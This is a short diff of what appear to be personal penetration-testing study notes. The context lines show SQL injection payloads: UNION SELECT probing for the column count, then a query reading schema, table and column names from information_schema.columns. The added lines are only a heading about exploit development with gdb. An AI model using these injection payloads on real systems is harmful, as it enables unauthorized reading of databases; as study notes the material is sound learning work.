@@ -86,6 +86,8 @@ Audi' UNION select 1,2,3 #
 keep adding until it spits out an output
 Audi' Union select 1,2,3,4,5 # works, but it doesn't display 2. 2 is just filler so we can see what we want, so it will look a lot like this
 Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+
+Exploit Development (The gdb stuff) 
 \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 --------------------------------------------------------------RECAP---------------------------------------------------------------------------------------
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
